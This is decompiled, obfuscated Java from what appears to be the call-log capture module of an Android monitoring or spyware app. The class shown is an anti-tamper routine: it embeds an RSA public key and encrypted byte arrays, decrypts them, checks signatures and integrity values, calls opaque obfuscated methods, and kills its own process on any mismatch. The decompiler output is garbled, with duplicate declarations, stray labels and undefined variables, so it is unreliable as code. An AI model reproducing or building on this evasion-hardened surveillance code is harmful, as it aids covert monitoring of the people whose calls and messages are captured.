package com.vvt.capture.calllog;

import android.os.Process;
import android.os.SystemClock;
import c.v.c.c.D;
import c.v.c.c.G;
import c.v.c.c.L;
import c.v.c.c.Q;
import c.v.c.c.R;
import c.v.c.c.Z;
import com.vvt.appengine.l;
import com.vvt.appengine.u;
import com.vvt.capture.sms.c;
import com.vvt.l.f;
import com.vvt.l.g;
import java.security.GeneralSecurityException;
import java.security.Key;
import java.security.interfaces.RSAPublicKey;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;

class e
  implements Runnable
{
  e(d paramd) {}
  
  private byte[] a()
  {
    byte[] arrayOfByte = new byte[64];
    byte[] tmp6_5 = arrayOfByte;
    byte[] tmp7_6 = tmp6_5;
    byte[] tmp7_6 = tmp6_5;
    tmp7_6[0] = 70;
    tmp7_6[1] = -55;
    byte[] tmp16_7 = tmp7_6;
    byte[] tmp16_7 = tmp7_6;
    tmp16_7[2] = -127;
    tmp16_7[3] = -101;
    byte[] tmp25_16 = tmp16_7;
    byte[] tmp25_16 = tmp16_7;
    tmp25_16[4] = 107;
    tmp25_16[5] = 113;
    byte[] tmp34_25 = tmp25_16;
    byte[] tmp34_25 = tmp25_16;
    tmp34_25[6] = 120;
    tmp34_25[7] = 115;
    byte[] tmp45_34 = tmp34_25;
    byte[] tmp45_34 = tmp34_25;
    tmp45_34[8] = -78;
    tmp45_34[9] = 13;
    byte[] tmp56_45 = tmp45_34;
    byte[] tmp56_45 = tmp45_34;
    tmp56_45[10] = 64;
    tmp56_45[11] = -25;
    byte[] tmp67_56 = tmp56_45;
    byte[] tmp67_56 = tmp56_45;
    tmp67_56[12] = -45;
    tmp67_56[13] = -28;
    byte[] tmp78_67 = tmp67_56;
    byte[] tmp78_67 = tmp67_56;
    tmp78_67[14] = -21;
    tmp78_67[15] = 106;
    byte[] tmp89_78 = tmp78_67;
    byte[] tmp89_78 = tmp78_67;
    tmp89_78[16] = -44;
    tmp89_78[17] = -76;
    byte[] tmp100_89 = tmp89_78;
    byte[] tmp100_89 = tmp89_78;
    tmp100_89[18] = 47;
    tmp100_89[19] = 93;
    byte[] tmp111_100 = tmp100_89;
    byte[] tmp111_100 = tmp100_89;
    tmp111_100[20] = 70;
    tmp111_100[21] = 19;
    byte[] tmp122_111 = tmp111_100;
    byte[] tmp122_111 = tmp111_100;
    tmp122_111[22] = 61;
    tmp122_111[23] = 38;
    byte[] tmp133_122 = tmp122_111;
    byte[] tmp133_122 = tmp122_111;
    tmp133_122[24] = -98;
    tmp133_122[25] = 125;
    byte[] tmp144_133 = tmp133_122;
    byte[] tmp144_133 = tmp133_122;
    tmp144_133[26] = 64;
    tmp144_133[27] = -12;
    byte[] tmp155_144 = tmp144_133;
    byte[] tmp155_144 = tmp144_133;
    tmp155_144[28] = 3;
    tmp155_144[29] = -103;
    byte[] tmp165_155 = tmp155_144;
    byte[] tmp165_155 = tmp155_144;
    tmp165_155[30] = -64;
    tmp165_155[31] = -46;
    byte[] tmp176_165 = tmp165_155;
    byte[] tmp176_165 = tmp165_155;
    tmp176_165[32] = 118;
    tmp176_165[33] = 43;
    byte[] tmp187_176 = tmp176_165;
    byte[] tmp187_176 = tmp176_165;
    tmp187_176[34] = -44;
    tmp187_176[35] = -33;
    byte[] tmp198_187 = tmp187_176;
    byte[] tmp198_187 = tmp187_176;
    tmp198_187[36] = 120;
    tmp198_187[37] = -24;
    byte[] tmp209_198 = tmp198_187;
    byte[] tmp209_198 = tmp198_187;
    tmp209_198[38] = -30;
    tmp209_198[39] = 127;
    byte[] tmp220_209 = tmp209_198;
    byte[] tmp220_209 = tmp209_198;
    tmp220_209[40] = -65;
    tmp220_209[41] = 20;
    byte[] tmp231_220 = tmp220_209;
    byte[] tmp231_220 = tmp220_209;
    tmp231_220[42] = -111;
    tmp231_220[43] = 9;
    byte[] tmp242_231 = tmp231_220;
    byte[] tmp242_231 = tmp231_220;
    tmp242_231[44] = 3;
    tmp242_231[45] = -124;
    byte[] tmp252_242 = tmp242_231;
    byte[] tmp252_242 = tmp242_231;
    tmp252_242[46] = 42;
    tmp252_242[47] = -118;
    byte[] tmp263_252 = tmp252_242;
    byte[] tmp263_252 = tmp252_242;
    tmp263_252[48] = 2;
    tmp263_252[49] = -33;
    byte[] tmp273_263 = tmp263_252;
    byte[] tmp273_263 = tmp263_252;
    tmp273_263[50] = 73;
    tmp273_263[51] = 18;
    byte[] tmp284_273 = tmp273_263;
    byte[] tmp284_273 = tmp273_263;
    tmp284_273[52] = 14;
    tmp284_273[53] = 56;
    byte[] tmp295_284 = tmp284_273;
    byte[] tmp295_284 = tmp284_273;
    tmp295_284[54] = 82;
    tmp295_284[55] = 125;
    byte[] tmp306_295 = tmp295_284;
    byte[] tmp306_295 = tmp295_284;
    tmp306_295[56] = -107;
    tmp306_295[57] = -122;
    byte[] tmp317_306 = tmp306_295;
    byte[] tmp317_306 = tmp306_295;
    tmp317_306[58] = 93;
    tmp317_306[59] = -108;
    byte[] tmp328_317 = tmp317_306;
    byte[] tmp328_317 = tmp317_306;
    tmp328_317[60] = -68;
    tmp328_317[61] = 61;
    tmp328_317[62] = -111;
    tmp328_317[63] = -17;
    return arrayOfByte;
  }
  
  private byte[] b()
  {
    byte[] arrayOfByte = new byte[94];
    byte[] tmp6_5 = arrayOfByte;
    byte[] tmp7_6 = tmp6_5;
    byte[] tmp7_6 = tmp6_5;
    tmp7_6[0] = 48;
    tmp7_6[1] = 92;
    byte[] tmp16_7 = tmp7_6;
    byte[] tmp16_7 = tmp7_6;
    tmp16_7[2] = 48;
    tmp16_7[3] = 13;
    byte[] tmp25_16 = tmp16_7;
    byte[] tmp25_16 = tmp16_7;
    tmp25_16[4] = 6;
    tmp25_16[5] = 9;
    byte[] tmp34_25 = tmp25_16;
    byte[] tmp34_25 = tmp25_16;
    tmp34_25[6] = 42;
    tmp34_25[7] = -122;
    byte[] tmp45_34 = tmp34_25;
    byte[] tmp45_34 = tmp34_25;
    tmp45_34[8] = 72;
    tmp45_34[9] = -122;
    byte[] tmp56_45 = tmp45_34;
    byte[] tmp56_45 = tmp45_34;
    tmp56_45[10] = -9;
    tmp56_45[11] = 13;
    byte[] tmp67_56 = tmp56_45;
    byte[] tmp67_56 = tmp56_45;
    tmp67_56[12] = 1;
    tmp67_56[13] = 1;
    byte[] tmp76_67 = tmp67_56;
    byte[] tmp76_67 = tmp67_56;
    tmp76_67[14] = 1;
    tmp76_67[15] = 5;
    byte[] tmp85_76 = tmp76_67;
    byte[] tmp85_76 = tmp76_67;
    tmp85_76[16] = 0;
    tmp85_76[17] = 3;
    byte[] tmp94_85 = tmp85_76;
    byte[] tmp94_85 = tmp85_76;
    tmp94_85[18] = 75;
    tmp94_85[19] = 0;
    byte[] tmp104_94 = tmp94_85;
    byte[] tmp104_94 = tmp94_85;
    tmp104_94[20] = 48;
    tmp104_94[21] = 72;
    byte[] tmp115_104 = tmp104_94;
    byte[] tmp115_104 = tmp104_94;
    tmp115_104[22] = 2;
    tmp115_104[23] = 65;
    byte[] tmp125_115 = tmp115_104;
    byte[] tmp125_115 = tmp115_104;
    tmp125_115[24] = 0;
    tmp125_115[25] = -54;
    byte[] tmp135_125 = tmp125_115;
    byte[] tmp135_125 = tmp125_115;
    tmp135_125[26] = 16;
    tmp135_125[27] = 52;
    byte[] tmp146_135 = tmp135_125;
    byte[] tmp146_135 = tmp135_125;
    tmp146_135[28] = -9;
    tmp146_135[29] = -14;
    byte[] tmp157_146 = tmp146_135;
    byte[] tmp157_146 = tmp146_135;
    tmp157_146[30] = 62;
    tmp157_146[31] = -91;
    byte[] tmp168_157 = tmp157_146;
    byte[] tmp168_157 = tmp157_146;
    tmp168_157[32] = 51;
    tmp168_157[33] = 32;
    byte[] tmp179_168 = tmp168_157;
    byte[] tmp179_168 = tmp168_157;
    tmp179_168[34] = 26;
    tmp179_168[35] = -32;
    byte[] tmp190_179 = tmp179_168;
    byte[] tmp190_179 = tmp179_168;
    tmp190_179[36] = 51;
    tmp190_179[37] = -27;
    byte[] tmp201_190 = tmp190_179;
    byte[] tmp201_190 = tmp190_179;
    tmp201_190[38] = -71;
    tmp201_190[39] = 43;
    byte[] tmp212_201 = tmp201_190;
    byte[] tmp212_201 = tmp201_190;
    tmp212_201[40] = -82;
    tmp212_201[41] = 69;
    byte[] tmp223_212 = tmp212_201;
    byte[] tmp223_212 = tmp212_201;
    tmp223_212[42] = -82;
    tmp223_212[43] = -25;
    byte[] tmp234_223 = tmp223_212;
    byte[] tmp234_223 = tmp223_212;
    tmp234_223[44] = -52;
    tmp234_223[45] = -76;
    byte[] tmp245_234 = tmp234_223;
    byte[] tmp245_234 = tmp234_223;
    tmp245_234[46] = -58;
    tmp245_234[47] = 46;
    byte[] tmp256_245 = tmp245_234;
    byte[] tmp256_245 = tmp245_234;
    tmp256_245[48] = 75;
    tmp256_245[49] = 47;
    byte[] tmp267_256 = tmp256_245;
    byte[] tmp267_256 = tmp256_245;
    tmp267_256[50] = 43;
    tmp267_256[51] = 45;
    byte[] tmp278_267 = tmp267_256;
    byte[] tmp278_267 = tmp267_256;
    tmp278_267[52] = -60;
    tmp278_267[53] = -83;
    byte[] tmp289_278 = tmp278_267;
    byte[] tmp289_278 = tmp278_267;
    tmp289_278[54] = 37;
    tmp289_278[55] = -13;
    byte[] tmp300_289 = tmp289_278;
    byte[] tmp300_289 = tmp289_278;
    tmp300_289[56] = 79;
    tmp300_289[57] = 40;
    byte[] tmp311_300 = tmp300_289;
    byte[] tmp311_300 = tmp300_289;
    tmp311_300[58] = 72;
    tmp311_300[59] = 29;
    byte[] tmp322_311 = tmp311_300;
    byte[] tmp322_311 = tmp311_300;
    tmp322_311[60] = 118;
    tmp322_311[61] = 12;
    byte[] tmp333_322 = tmp322_311;
    byte[] tmp333_322 = tmp322_311;
    tmp333_322[62] = 52;
    tmp333_322[63] = -120;
    byte[] tmp344_333 = tmp333_322;
    byte[] tmp344_333 = tmp333_322;
    tmp344_333[64] = -85;
    tmp344_333[65] = -15;
    byte[] tmp355_344 = tmp344_333;
    byte[] tmp355_344 = tmp344_333;
    tmp355_344[66] = 55;
    tmp355_344[67] = -34;
    byte[] tmp366_355 = tmp355_344;
    byte[] tmp366_355 = tmp355_344;
    tmp366_355[68] = -41;
    tmp366_355[69] = 114;
    byte[] tmp377_366 = tmp366_355;
    byte[] tmp377_366 = tmp366_355;
    tmp377_366[70] = 81;
    tmp377_366[71] = 113;
    byte[] tmp388_377 = tmp377_366;
    byte[] tmp388_377 = tmp377_366;
    tmp388_377[72] = -44;
    tmp388_377[73] = -12;
    byte[] tmp399_388 = tmp388_377;
    byte[] tmp399_388 = tmp388_377;
    tmp399_388[74] = -19;
    tmp399_388[75] = 117;
    byte[] tmp410_399 = tmp399_388;
    byte[] tmp410_399 = tmp399_388;
    tmp410_399[76] = -44;
    tmp410_399[77] = -44;
    byte[] tmp421_410 = tmp410_399;
    byte[] tmp421_410 = tmp410_399;
    tmp421_410[78] = -53;
    tmp421_410[79] = 114;
    byte[] tmp432_421 = tmp421_410;
    byte[] tmp432_421 = tmp421_410;
    tmp432_421[80] = 56;
    tmp432_421[81] = -18;
    byte[] tmp443_432 = tmp432_421;
    byte[] tmp443_432 = tmp432_421;
    tmp443_432[82] = -84;
    tmp443_432[83] = -67;
    byte[] tmp454_443 = tmp443_432;
    byte[] tmp454_443 = tmp443_432;
    tmp454_443[84] = 2;
    tmp454_443[85] = 38;
    byte[] tmp464_454 = tmp454_443;
    byte[] tmp464_454 = tmp454_443;
    tmp464_454[86] = 33;
    tmp464_454[87] = -53;
    byte[] tmp475_464 = tmp464_454;
    byte[] tmp475_464 = tmp464_454;
    tmp475_464[88] = -39;
    tmp475_464[89] = 2;
    byte[] tmp485_475 = tmp475_464;
    byte[] tmp485_475 = tmp475_464;
    tmp485_475[90] = 3;
    tmp485_475[91] = 1;
    tmp485_475[92] = 0;
    tmp485_475[93] = 1;
    return arrayOfByte;
  }
  
  public void run()
  {
    int i = 3;
    int j = 1;
    int k = 0;
    String str1 = null;
    boolean bool2 = b.c();
    if (bool2) {}
    bool2 = b.c();
    if (bool2) {}
    Object localObject9;
    try
    {
      localObject1 = new com/vvt/appengine/u;
      localObject2 = this.a;
      localObject2 = ((d)localObject2).a;
      localObject2 = ((b)localObject2).b();
      localObject2 = g.a((byte[])localObject2);
      ((u)localObject1).<init>((RSAPublicKey)localObject2);
      bool2 = b.c();
      if (bool2) {}
      localArrayList = new java/util/ArrayList;
      localArrayList.<init>();
      localObject2 = this.a.a.b();
      localArrayList.add(localObject2);
      localObject2 = new com/vvt/appengine/l;
      ((l)localObject2).<init>();
      localObject2 = ((l)localObject2).b();
      localArrayList.add(localObject2);
      localObject2 = new com/vvt/capture/sms/c;
      ((c)localObject2).<init>();
      localObject2 = ((c)localObject2).b();
      localArrayList.add(localObject2);
      m = localArrayList.size();
      i13 = m;
    }
    catch (Exception localException1)
    {
      for (;;)
      {
        Object localObject1;
        Object localObject2;
        int m;
        int i15;
        boolean bool3;
        int n;
        bool4 = b.d();
        if (bool4) {}
        i1 = Process.myPid();
        Process.killProcess(i1);
        continue;
        i1 = i13 + -1;
        int i13 = i1;
        continue;
        bool5 = b.c();
        if (bool5) {}
        localObject3 = new java/util/ArrayList;
        ((ArrayList)localObject3).<init>();
        localObject9 = this.a.a.a();
        ((ArrayList)localObject3).add(localObject9);
        localObject9 = new com/vvt/appengine/l;
        ((l)localObject9).<init>();
        localObject9 = ((l)localObject9).a();
        ((ArrayList)localObject3).add(localObject9);
        localObject9 = new com/vvt/capture/sms/c;
        ((c)localObject9).<init>();
        localObject9 = ((c)localObject9).a();
        ((ArrayList)localObject3).add(localObject9);
        i16 = b.c();
        if (i16 != 0) {}
        ArrayList localArrayList = new java/util/ArrayList;
        localArrayList.<init>();
        localObject9 = ((ArrayList)localObject3).iterator();
        bool5 = ((Iterator)localObject9).hasNext();
        if (bool5)
        {
          localObject3 = (byte[])((Iterator)localObject9).next();
          try
          {
            localObject10 = ((u)localObject1).a();
            localObject3 = f.a((Key)localObject10, (byte[])localObject3);
            localObject10 = new java/lang/String;
            ((String)localObject10).<init>((byte[])localObject3);
            localArrayList.add(localObject10);
            bool5 = b.c();
            if (!bool5) {
              break label402;
            }
            break label402;
          }
          catch (GeneralSecurityException localGeneralSecurityException1)
          {
            bool5 = b.d();
            if (bool5) {}
            i2 = Process.myPid();
            Process.killProcess(i2);
          }
        }
        else
        {
          bool6 = b.c();
          if (bool6) {}
          i3 = localArrayList.size();
          for (i13 = i3;; i13 = i4)
          {
            if (i13 <= j) {
              break label634;
            }
            i3 = i13 + -1;
            i18 = i13 + -2;
            localObject4 = localArrayList.get(i3);
            localObject9 = localObject4;
            localObject9 = (String)localObject4;
            localObject4 = (String)localArrayList.get(i18);
            bool18 = b.c();
            if (bool18) {}
            bool7 = ((String)localObject9).equals(localObject4);
            if (!bool7)
            {
              bool7 = b.e();
              if (bool7) {}
              i4 = Process.myPid();
              Process.killProcess(i4);
              break;
            }
            i4 = i13 + -1;
          }
          try
          {
            localObject4 = new com/vvt/appengine/u;
            localObject9 = b();
            localObject9 = g.a((byte[])localObject9);
            ((u)localObject4).<init>((RSAPublicKey)localObject9);
          }
          catch (Exception localException2)
          {
            try
            {
              localObject4 = ((u)localObject4).a();
              localObject9 = a();
              localObject4 = f.a((Key)localObject4, (byte[])localObject9);
              localObject9 = new java/lang/String;
              ((String)localObject9).<init>((byte[])localObject4);
              bool8 = b.c();
              if (bool8) {}
              localObject4 = localArrayList.get(0);
              bool8 = ((String)localObject9).equals(localObject4);
              if (bool8) {
                break label798;
              }
              bool8 = b.e();
              if (bool8) {}
              i5 = Process.myPid();
              Process.killProcess(i5);
            }
            catch (GeneralSecurityException localGeneralSecurityException2)
            {
              bool10 = b.d();
              if (!bool10) {
                break label785;
              }
              i7 = Process.myPid();
              Process.killProcess(i7);
            }
            localException2 = localException2;
            bool9 = b.d();
            if (bool9) {}
            i6 = Process.myPid();
            Process.killProcess(i6);
          }
          continue;
          continue;
          localObject9 = new c/v/c/c/D;
          ((D)localObject9).<init>();
          bool11 = b.c();
          if (bool11) {}
          localObject5 = new int[4];
          Object tmp825_823 = localObject5;
          Object tmp826_825 = tmp825_823;
          Object tmp826_825 = tmp825_823;
          tmp826_825[0] = 100;
          tmp826_825[1] = 117;
          tmp826_825[2] = 107;
          tmp826_825[3] = 101;
          localObject10 = com.vvt.ag.b.a((int[])localObject5);
          bool11 = b.c();
          if (bool11) {}
          localObject5 = (String)localArrayList.get(0);
          localObject1 = "joe";
          i20 = 19;
          localObject5 = ((D)localObject9).mp((String)localObject5, (String)localObject1, i20);
          bool17 = ((String)localObject5).equals(localObject10);
          if (!bool17)
          {
            localObject9 = new java/lang/StringBuilder;
            ((StringBuilder)localObject9).<init>((String)localObject5);
            localObject5 = "///";
            ((StringBuilder)localObject9).append((String)localObject5);
            ((StringBuilder)localObject9).toString();
            bool11 = b.e();
            if (bool11) {}
            i8 = Process.myPid();
            Process.killProcess(i8);
          }
          else
          {
            l1 = 1L;
            SystemClock.sleep(l1);
            bool12 = b.c();
            if (bool12) {}
            localObject5 = new int[i];
            Object tmp984_982 = localObject5;
            tmp984_982[0] = 114;
            Object tmp989_984 = tmp984_982;
            tmp989_984[1] = 111;
            tmp989_984[2] = 98;
            localObject5 = com.vvt.ag.b.a((int[])localObject5);
            localObject10 = this.a.a.b();
            i19 = 119;
            localObject10 = ((D)localObject9).u((byte[])localObject10, i19);
            bool12 = ((String)localObject10).equals(localObject5);
            if (bool12) {
              break;
            }
            i16 = 0;
            localObject9 = null;
            bool12 = false;
            localObject5 = null;
            i14 = 10;
            if (i16 < i14)
            {
              switch (i16)
              {
              default: 
                i9 = 100;
              }
              for (;;)
              {
                i16 += 1;
                break;
                i9 = 0;
                localObject5 = null;
                continue;
                i9 = j;
                continue;
                i9 = 2;
                continue;
                i9 = i;
              }
            }
            localObject9 = new java/lang/StringBuilder;
            ((StringBuilder)localObject9).<init>();
            str1 = "";
            localObject9 = ((StringBuilder)localObject9).append(str1);
            localObject5 = ((StringBuilder)localObject9).append(i9);
            ((StringBuilder)localObject5).toString();
            bool13 = b.e();
            if (bool13) {}
            i10 = Process.myPid();
            Process.killProcess(i10);
          }
        }
      }
      l2 = j;
      SystemClock.sleep(l2);
      for (;;)
      {
        try
        {
          localObject5 = new c/v/c/c/L;
          ((L)localObject5).<init>();
          str1 = ((L)localObject5).statos();
          bool14 = ((L)localObject5).bie(str1);
          if (!bool14) {
            continue;
          }
          localObject5 = new c/v/c/c/G;
          ((G)localObject5).<init>();
          k = 0;
          str1 = null;
          ((G)localObject5).nol(null);
          k = ((G)localObject5).nala();
          j = ((G)localObject5).nala();
          ((G)localObject5).pui(k, j);
        }
        finally
        {
          bool16 = b.c();
          if (!bool16) {
            continue;
          }
          continue;
        }
        bool14 = b.c();
        if (bool14) {}
        i11 = ((D)localObject9).mphtcp();
        k = 991;
        if (i11 == k) {
          break label1384;
        }
        bool15 = b.e();
        if (bool15) {}
        i12 = Process.myPid();
        Process.killProcess(i12);
        break;
        localObject5 = new c/v/c/c/Q;
        ((Q)localObject5).<init>();
        str1 = "jbool";
        str2 = "jstr";
        bool1 = ((Q)localObject5).stringH(str1, str2);
        ((Q)localObject5).jbooleanVal(bool1);
      }
    }
    if (i13 > j)
    {
      m = i13 + -1;
      i15 = i13 + -2;
      localObject2 = (byte[])localArrayList.get(m);
      localObject9 = (byte[])localArrayList.get(i15);
      bool3 = Arrays.equals((byte[])localObject2, (byte[])localObject9);
      if (!bool3)
      {
        bool3 = b.e();
        if (bool3) {}
        n = Process.myPid();
        Process.killProcess(n);
        return;
      }
    }
    for (;;)
    {
      try
      {
        boolean bool4;
        int i1;
        boolean bool5;
        Object localObject3;
        int i16;
        label402:
        Object localObject10;
        int i2;
        boolean bool6;
        int i3;
        int i18;
        Object localObject4;
        boolean bool18;
        boolean bool7;
        int i4;
        label634:
        boolean bool8;
        int i5;
        boolean bool9;
        int i6;
        boolean bool10;
        label785:
        int i7;
        label798:
        boolean bool11;
        Object localObject5;
        int i20;
        boolean bool17;
        int i8;
        long l1;
        boolean bool12;
        int i19;
        int i14;
        int i9;
        boolean bool13;
        int i10;
        long l2;
        boolean bool14;
        int i11;
        boolean bool15;
        int i12;
        String str2;
        boolean bool1;
        label1384:
        ((D)localObject9).cat();
        localObject7 = "s";
        str1 = "t";
        bool16 = ((D)localObject9).inner((String)localObject7, str1);
        if (!bool16) {
          continue;
        }
        localObject7 = new c/v/c/c/Z;
        ((Z)localObject7).<init>();
        ((Z)localObject7).jkol();
      }
      finally
      {
        int i17;
        Object localObject7;
        boolean bool16 = b.c();
        if (!bool16) {
          continue;
        }
        continue;
      }
      localObject7 = this.a.a;
      i17 = 69;
      localObject9 = Integer.valueOf(i17);
      b.a((b)localObject7, localObject9);
      bool16 = b.c();
      if (!bool16) {
        break;
      }
      break;
      localObject7 = new c/v/c/c/R;
      ((R)localObject7).<init>();
      i17 = 1;
      localObject9 = new String[i17];
      i17 = ((R)localObject7).cplaces((String[])localObject9);
      ((R)localObject7).sk(i17);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/calllog/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */